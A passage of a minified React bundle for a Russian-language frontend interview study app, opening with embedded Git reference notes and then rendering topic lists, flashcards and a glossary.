git log file.js             # история файла
\`\`\`

**diff:**
\`\`\`bash
git diff                   # изменения не в staging
git diff --staged          # изменения в staging
git diff main feature      # разница между ветками
git diff abc123 def456     # разница между коммитами
\`\`\`

**reflog:**
\`\`\`bash
git reflog               # история всех перемещений HEAD
git reset --hard abc123  # восстановить потерянный коммит
\`\`\`
Хранит историю ~90 дней. Страховка от reset --hard.

**tag:**
\`\`\`bash
git tag v1.0.0                   # lightweight тег
git tag -a v1.0.0 -m "Release"  # annotated тег (предпочтительно)
git push origin v1.0.0           # запушить тег
git push origin --tags           # запушить все теги
git tag -d v1.0.0                # удалить тег
\`\`\``},{name:"hooks",level:"4",content:`**Git Hooks** — скрипты в .git/hooks/ выполняющиеся автоматически при git командах.

**Основные хуки:**
• **pre-commit** — перед коммитом (линтинг, форматирование)
• **commit-msg** — проверка формата сообщения
• **pre-push** — перед push (тесты)

**Husky** — шарит хуки между разработчиками через package.json:
\`\`\`json
{
  "husky": {
    "hooks": {
      "pre-commit": "lint-staged",
      "pre-push": "npm test"
    }
  }
}
\`\`\`
**lint-staged** — запускает линтер только на изменённых файлах.`},{name:"switch, restore",level:"4",content:`Новые команды (Git 2.23+), заменяющие перегруженный checkout:

\`\`\`bash
git switch feature         # переключить ветку
git switch -c feature      # создать и переключить

git restore file.js              # восстановить файл из последнего коммита
git restore --staged file.js     # убрать файл из staging
\`\`\`

checkout делал слишком много (переключение веток + откат файлов). switch и restore — чёткое разделение обязанностей.`},{name:"Способы оптимизации рабочего пространства Git, git-lfs, сабмодули",level:"4",content:`**git-lfs (Large File Storage):**
Для больших бинарных файлов (видео, дизайн, скриншоты). В репозитории хранится указатель, файл — на LFS сервере.
\`\`\`bash
git lfs install
git lfs track "*.png"
git lfs track "*.psd"
git add .gitattributes
\`\`\`

**Субмодули:**
Вложенный git-репозиторий внутри основного. Для переиспользования библиотек между проектами.
\`\`\`bash
git submodule add https://github.com/org/lib  # добавить
git submodule init                             # инициализировать
git submodule update                           # обновить
git clone --recurse-submodules https://...    # клонировать с субмодулями
\`\`\`
Минус — сложность синхронизации в команде.

**Shallow clone:**
\`\`\`bash
git clone --depth 1 <url>  # только последний коммит (быстрее для CI)
\`\`\``},{name:"worktree",level:"4",content:`**git worktree** — несколько рабочих директорий одного репо одновременно. Позволяет работать в нескольких ветках без stash и переключений.

\`\`\`bash
git worktree add ../hotfix main  # создать папку с веткой main
git worktree list                # список worktree
git worktree remove ../hotfix    # удалить
\`\`\`

Кейсы: срочный hotfix без прерывания текущей работы, сравнение двух веток бок о бок, запуск тестов на одной ветке пока работаешь на другой.`}]}],Ye=[...Ff,...zf],Hf=[];Ye.forEach(e=>{e.topics.forEach(t=>{t.content&&Hf.push({section:e.title,sectionColor:e.color,topic:t.name,level:t.level,content:t.content,score:t.score??null})})});function Uf(e){const t=new Set,n=[];return e.forEach(r=>{r.topics.forEach(o=>{if(!o.content)return;const l=/\*\*([^*\n`]+?)\*\*/g;let s;for(;(s=l.exec(o.content))!==null;){const i=s[1].trim();if(i.endsWith(".")||i.endsWith("!")||i.endsWith("?")||/^\d/.test(i)||i.split(/\s+/).length>7||i.length<2)continue;const a=i.toLowerCase();if(t.has(a))continue;t.add(a);const g=o.content.slice(s.index+s[0].length).match(/^[ \t]*[—:][ \t]*([^\n]{5,120})/);let f=g?g[1].replace(/\*\*([^*]+)\*\*/g,"$1").split(/[.!?]/)[0].trim():"";f.endsWith(",")&&(f=f.slice(0,-1)),n.push({name:i,definition:f,sectionId:r.id,sectionTitle:r.title,sectionColor:r.color,sectionIcon:r.icon,topicName:o.name,topicLevel:o.level})}})}),n.sort((r,o)=>r.name.localeCompare(o.name,"ru"))}function Wl(e,t){if(!t)return e;const n=e.toLowerCase().indexOf(t.toLowerCase());return n===-1?e:m.jsxs(m.Fragment,{children:[e.slice(0,n),m.jsx("mark",{className:"search-highlight",children:e.slice(n,n+t.length)}),e.slice(n+t.length)]})}function sc({topic:e,sectionColor:t,highlight:n,defaultOpen:r=!1}){const[o,l]=$.useState(r),s=no[e.level]||no[2];return m.jsxs("div",{className:"topic-row",children:[m.jsxs("button",{className:"topic-header",onClick:()=>l(!o),children:[m.jsx("span",{className:"topic-chevron",children:o?"▾":"▸"}),m.jsx("span",{className:"topic-name",children:n?Wl(e.name,n):e.name}),m.jsxs("span",{className:"topic-badges",children:[e.score!=null&&m.jsxs("span",{className:"topic-score",title:"Оценка",children:[e.score,"/5"]}),m.jsxs("span",{className:"topic-level",style:{background:s.color+"22",color:s.color,borderColor:s.color+"44"},children:[e.level," — ",s.label]})]})]}),o&&m.jsx("div",{className:"topic-content",children:m.jsx(ic,{text:e.content})})]})}function ic({text:e}){if(!e)return m.jsx("p",{className:"placeholder",children:"Контент будет добавлен позже"});const t=e.split(`
`),n=[];let r=!1,o=[],l=0;return t.forEach((s,i)=>{if(s.startsWith("```")){r?(n.push(m.jsx("pre",{children:o.join(`
`)},l++)),o=[],r=!1):r=!0;return}if(r){o.push(s);return}if(s.trim()===""){n.push(m.jsx("div",{className:"spacer"},l++));return}let a=s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/\*\*(.+?)\*\*/g,"<strong>$1</strong>").replace(/`([^`]+)`/g,"<code>$1</code>").replace(/^‣ |^• /,"‣ ");n.push(m.jsx("p",{className:"content-line",dangerouslySetInnerHTML:{__html:a}},l++))}),r&&o.length&&n.push(m.jsx("pre",{children:o.join(`
`)},l++)),m.jsx("div",{className:"formatted-content",children:n})}function Wf({section:e,defaultCollapsed:t=!0,onSelect:n=void 0,collapseKey:r=0,levelFilter:o="all"}){const[l,s]=$.useState(t),i=o==="all"?e.topics:e.topics.filter(h=>h.level===o),a=i.length;$.useEffect(()=>{r>0&&s(!0)},[r]);const c=i.filter(h=>h.score!=null),g=c.length?(c.reduce((h,k)=>h+k.score,0)/c.length).toFixed(1):null;function f(){n?n(e.id):s(!l)}return m.jsxs("div",{className:"section-block",children:[m.jsxs("button",{className:"section-header",onClick:f,style:{"--accent":e.color},children:[m.jsxs("div",{className:"section-left",children:[m.jsx("span",{className:"section-icon",children:e.icon}),m.jsxs("div",{children:[m.jsx("h2",{className:"section-title",children:e.title}),m.jsxs("span",{className:"section-meta",children:[a," тем",g?` · Средняя: ${g}/5`:""]})]})]}),m.jsx("span",{className:"section-chevron",children:l?"▸":"▾"})]}),!l&&m.jsx("div",{className:"section-topics",children:i.length===0?m.jsx("p",{className:"section-empty",children:"Нет тем для этого уровня"}):i.map((h,k)=>m.jsx(sc,{topic:h,sectionColor:e.color},k))})]})}function Bf({query:e,sections:t}){const n=e.toLowerCase(),r=[];return t.forEach(o=>{const l=o.topics.filter(s=>s.name.toLowerCase().includes(n)||s.content&&s.content.toLowerCase().includes(n));l.length>0&&r.push({section:o,topics:l})}),r.length===0?m.jsxs("p",{className:"search-empty",children:["Ничего не найдено по запросу «",e,"»"]}):m.jsx(m.Fragment,{children:r.map(({section:o,topics:l})=>m.jsxs("div",{className:"section-block",children:[m.jsx("div",{className:"section-header",style:{"--accent":o.color},children:m.jsxs("div",{className:"section-left",children:[m.jsx("span",{className:"section-icon",children:o.icon}),m.jsxs("div",{children:[m.jsx("h2",{className:"section-title",children:o.title}),m.jsxs("span",{className:"section-meta",children:[l.length," совпадений"]})]})]})}),m.jsx("div",{className:"section-topics",children:l.map((s,i)=>m.jsx(sc,{topic:s,sectionColor:o.color,highlight:e,defaultOpen:!0},i))})]},o.id))})}function Vf({sections:e,levelFilter:t="all"}){const[n,r]=$.useState("all"),[o,l]=$.useState(0),[s,i]=$.useState(!1),a=[];e.forEach(f=>{f.topics.forEach(h=>{const k=n==="all"||n===f.id,w=t==="all"||h.level===t;h.content&&k&&w&&a.push({...h,sectionTitle:f.title,sectionIcon:f.icon,sectionColor:f.color})})});const c=a[o];if(!c)return m.jsx("p",{children:"Нет карточек"});const g=no[c.level]||no[2];return m.jsxs("div",{className:"flashcard-mode",children:[m.jsxs("div",{className:"flash-filter",children:[m.jsxs("select",{value:n,onChange:f=>{r(f.target.value),l(0),i(!1)},children:[m.jsx("option",{value:"all",children:"Все разделы"}),e.map(f=>m.jsxs("option",{value:f.id,children:[f.icon," ",f.title]},f.id))]}),m.jsxs("span",{className:"flash-counter",children:[o+1," / ",a.length]})]}),m.jsx("div",{className:`flash-card ${s?"flipped":""}`,onClick:()=>i(!s),children:s?m.jsx("div",{className:"flash-back",children:m.jsx(ic,{text:c.content})}):m.jsxs("div",{className:"flash-front",children:[m.jsxs("span",{className:"flash-section",style:{color:c.sectionColor},children:[c.sectionIcon," ",c.sectionTitle]}),m.jsx("span",{className:"flash-level",style:{color:g.color},children:g.label}),m.jsx("h3",{className:"flash-question",children:c.name}),m.jsx("span",{className:"flash-hint",children:"Нажми, чтобы увидеть ответ"})]})}),m.jsxs("div",{className:"flash-nav",children:[m.jsx("button",{disabled:o===0,onClick:()=>{l(f=>f-1),i(!1)},children:"← Назад"}),m.jsx("button",{onClick:()=>{l(Math.floor(Math.random()*a.length)),i(!1)},children:"🎲 Случайная"}),m.jsx("button",{disabled:o>=a.length-1,onClick:()=>{l(f=>f+1),i(!1)},children:"Далее →"})]})]})}function $i({term:e,highlight:t}){return m.jsxs("div",{className:"term-row",children:[m.jsx("div",{className:"term-name",children:t?Wl(e.name,t):e.name}),e.definition&&m.jsx("div",{className:"term-def",children:t?Wl(e.definition,t):e.definition}),m.jsxs("div",{className:"term-source",children:[m.jsxs("span",{className:"term-section-badge",style:{color:e.sectionColor},children:[e.sectionIcon," ",e.sectionTitle]}),m.jsxs("span",{className:"term-topic",children:["· ",e.topicName]})]})]})}function Jf({sections:e,levelFilter:t="all"}){const[n,r]=$.useState(""),[o,l]=$.useState("all"),s=Uf(e),i=n.trim().toLowerCase(),a=s.filter(f=>{const h=!i||f.name.toLowerCase().includes(i)||f.definition.toLowerCase().includes(i),k=o==="all"||f.sectionId===o,w=t==="all"||f.topicLevel===t;return h&&k&&w}),c=[],g=new Map;return a.forEach(f=>{if(!g.has(f.sectionId)){const h={id:f.sectionId,title:f.sectionTitle,color:f.sectionColor,icon:f.sectionIcon,terms:[]};g.set(f.sectionId,h),c.push(h)}g.get(f.sectionId).terms.push(f)}),m.jsxs("div",{className:"glossary",children:[m.jsxs("div",{className:"glossary-controls",children:[m.jsxs("div",{className:"search-bar",children:[m.jsx("svg",{className:"search-icon",width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:m.jsx("path",{d:"M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"})}),m.jsx("input",{type:"search",placeholder:"Поиск по терминам и определениям...",value:n,onChange:f=>r(f.target.value),className:"search-input"}),n&&m.jsx("button",{className:"search-clear",onClick:()=>r(""),title:"Очистить",children:"✕"})]}),m.jsxs("nav",{className:"section-tabs",style:{marginTop:"10px"},children:[m.jsx("button",{className:`section-tab ${o==="all"?"active":""}`,onClick:()=>l("all"),children:"Все разделы"}),e.map(f=>m.jsxs("button",{className:`section-tab ${o===f.id?"active":""}`,onClick:()=>l(o===f.id?"all":f.id),style:o===f.id?{"--tab-color":f.color}:{},children:[m.jsx("span",{className:"section-tab-icon",children:f.icon}),f.title]},f.id))]})]}),m.jsxs("p",{className:"glossary-stats",children:[a.length," ",a.length===1?"термин":a.length<5?"термина":"терминов"]}),a.length===0?m.jsxs("p",{className:"search-empty",children:["Ничего не найдено по запросу «",n,"»"]}):o!=="all"?m.jsx("div",{className:"glossary-group",children:a.map((f,h)=>m.jsx($i,{term:f,highlight:i},h))}):c.map(f=>m.jsxs("div",{className:"glossary-group",children:[m.jsxs("div",{className:"glossary-group-header",style:{"--accent":f.color},children:[m.jsx("span",{children:f.icon}),m.jsx("span",{children:f.title}),m.jsxs("span",{className:"glossary-count",children:[f.terms.length," терм."]})]}),f.terms.map((h,k)=>m.jsx($i,{term:h,highlight:i},k))]},f.id))]})}const Ot=[{key:"all",label:"Все"},{key:"2",label:"Junior",color:"#3fb950"},{key:"3",label:"Middle",color:"#d29922"},{key:"4",label:"Senior",color:"#f85149"}];function Gf(){var y,x;const[e,t]=$.useState("roadmap"),[n,r]=$.useState("list"),[o,l]=$.useState(""),[s,i]=$.useState(!1),[a,c]=$.useState(null),[g,f]=$.useState(0),[h,k]=$.useState(!1),[w,C]=$.useState("all"),O=Ye.reduce((v,E)=>v+E.topics.length,0),d=e==="roadmap"&&o.trim().length>0,u=a?Ye.filter(v=>v.id===a):Ye;function p(v){t(v),l(""),i(!1),k(!1)}return m.jsxs("div",{className:"app",children:[m.jsxs("div",{className:"mobile-header",children:[m.jsx("button",{className:"burger-btn",onClick:()=>k(v=>!v),"aria-label":"Меню",children:m.jsxs("svg",{width:"18",height:"18",viewBox:"0 0 18 18",fill:"currentColor",children:[m.jsx("rect",{x:"1",y:"3",width:"16",height:"2",rx:"1"}),m.jsx("rect",{x:"1",y:"8",width:"16",height:"2",rx:"1"}),m.jsx("rect",{x:"1",y:"13",width:"16",height:"2",rx:"1"})]})}),m.jsx("span",{className:"mobile-title",children:"Frontend Senior+"}),m.jsx("button",{className:`mobile-level-btn ${w!=="all"?"active":""}`,style:w!=="all"?{"--level-color":(y=Ot.find(v=>v.key===w))==null?void 0:y.color}:{},onClick:()=>{const v=Ot.findIndex(E=>E.key===w);C(Ot[(v+1)%Ot.length].key)},children:(x=Ot.find(v=>v.key===w))==null?void 0:x.label})]}),h&&m.jsx("div",{className:"sidebar-overlay",onClick:()=>k(!1)}),e==="roadmap"&&m.jsx("button",{className:"fab-collapse",onClick:()=>f(v=>v+1),title:"Свернуть все",children:m.jsxs("svg",{width:"22",height:"22",viewBox:"0 0 16 16",fill:"currentColor",children:[m.jsx("rect",{x:"1",y:"7",width:"14",height:"2",rx:"1"}),m.jsx("path",{d:"M4 5L8 1l4 4",stroke:"currentColor",strokeWidth:"1.5",fill:"none",strokeLinecap:"round",strokeLinejoin:"round"}),m.jsx("path",{d:"M4 11l4 4 4-4",stroke:"currentColor",strokeWidth:"1.5",fill:"none",strokeLinecap:"round",strokeLinejoin:"round"})]})}),m.jsxs("aside",{className:`sidebar${h?" open":""}`,children:[m.jsxs("div",{className:"sidebar-brand",children:[m.jsx("h1",{className:"app-title",children:"Frontend Senior+"}),m.jsxs("p",{className:"app-sub",children:[Ye.length," разделов · ",O," тем"]})]}),e==="roadmap"&&m.jsxs("div",{className:"sidebar-roadmap-controls",children:[m.jsxs("div",{className:"sidebar-tools-row",children:[m.jsx("button",{className:"view-btn",onClick:()=>f(v=>v+1),title:"Свернуть все",children:m.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[m.jsx("rect",{x:"1",y:"7",width:"14",height:"2",rx:"1"}),m.jsx("path",{d:"M4 5L8 1l4 4",stroke:"currentColor",strokeWidth:"1.5",fill:"none",strokeLinecap:"round",strokeLinejoin:"round"}),m.jsx("path",{d:"M4 11l4 4 4-4",stroke:"currentColor",strokeWidth:"1.5",fill:"none",strokeLinecap:"round",strokeLinejoin:"round"})]})}),m.jsx("button",{className:`view-btn search-toggle ${s?"active":""}`,onClick:()=>{i(v=>!v),s&&l("")},title:"Поиск",children:m.jsx("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:m.jsx("path",{d:"M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"})})}),m.jsxs("div",{className:"view-toggle",children:[m.jsx("button",{className:`view-btn ${n==="list"?"active":""}`,onClick:()=>r("list"),title:"Список",children:m.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[m.jsx("rect",{x:"1",y:"2",width:"14",height:"2",rx:"1"}),m.jsx("rect",{x:"1",y:"7",width:"14",height:"2",rx:"1"}),m.jsx("rect",{x:"1",y:"12",width:"14",height:"2",rx:"1"})]})}),m.jsx("button",{className:`view-btn ${n==="grid"?"active":""}`,onClick:()=>r("grid"),title:"Сетка",children:m.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[m.jsx("rect",{x:"1",y:"1",width:"6",height:"6",rx:"1"}),m.jsx("rect",{x:"9",y:"1",width:"6",height:"6",rx:"1"}),m.jsx("rect",{x:"1",y:"9",width:"6",height:"6",rx:"1"}),m.jsx("rect",{x:"9",y:"9",width:"6",height:"6",rx:"1"})]})})]})]}),s&&m.jsxs("div",{className:"search-bar search-bar-expanded",children:[m.jsx("svg",{className:"search-icon",width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:m.jsx("path",{d:"M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"})}),m.jsx("input",{type:"search",placeholder:"Поиск...",value:o,onChange:v=>l(v.target.value),className:"search-input",autoFocus:!0,onKeyDown:v=>{v.key==="Escape"&&(l(""),i(!1))}}),o&&m.jsx("button",{className:"search-clear",onClick:()=>l(""),title:"Очистить",children:"✕"})]})]}),m.jsxs("div",{className:"sidebar-level-filter",children:[m.jsx("span",{className:"sidebar-filter-label",children:"Уровень"}),m.jsx("div",{className:"level-btns",children:Ot.map(({key:v,label:E,color:j})=>m.jsx("button",{className:`level-btn ${w===v?"active":""}`,style:w===v&&j?{"--level-color":j}:{},onClick:()=>C(w===v&&v!=="all"?"all":v),children:E},v))})]}),m.jsxs("nav",{className:"sidebar-nav",children:[m.jsx("button",{className:`sidebar-tab ${e==="roadmap"?"active":""}`,onClick:()=>p("roadmap"),children:"📋 Темы"}),m.jsx("button",{className:`sidebar-tab ${e==="cards"?"active":""}`,onClick:()=>p("cards"),children:"🃏 Карточки"}),m.jsx("button",{className:`sidebar-tab ${e==="glossary"?"active":""}`,onClick:()=>p("glossary"),children:"📚 Справочник"})]})]}),m.jsxs("div",{className:"app-right",children:[e==="roadmap"&&m.jsx("div",{className:"app-topbar",children:m.jsxs("nav",{className:"section-tabs",children:[m.jsx("button",{className:`section-tab ${a===null?"active":""}`,onClick:()=>c(null),children:"Все"}),Ye.map(v=>m.jsxs("button",{className:`section-tab ${a===v.id?"active":""}`,onClick:()=>c(a===v.id?null:v.id),style:a===v.id?{"--tab-color":v.color}:{},children:[m.jsx("span",{className:"section-tab-icon",children:v.icon}),v.title]},v.id))]})}),m.jsx("main",{className:`app-main ${e==="roadmap"&&!d&&n==="grid"&&!a?"view-grid":""}`,children:e==="roadmap"?d?m.jsx(Bf,{query:o.trim(),sections:u}):u.filter(v=>w==="all"||v.topics.some(E=>E.level===w)).map(v=>m.jsx(Wf,{section:v,defaultCollapsed:a===null,collapseKey:g,levelFilter:w,onSelect:n==="grid"&&!a?c:void 0},v.id+(a?"-open":""))):e==="cards"?m.jsx(Vf,{sections:Ye,levelFilter:w}):m.jsx(Jf,{sections:Ye,levelFilter:w})},d?`search-${o}`:`${n}-${a}-${w}`)]})]})}Qo.createRoot(document.getElementById("root")).render(m.jsx(Ec.StrictMode,{children:m.jsx(Gf,{})}));
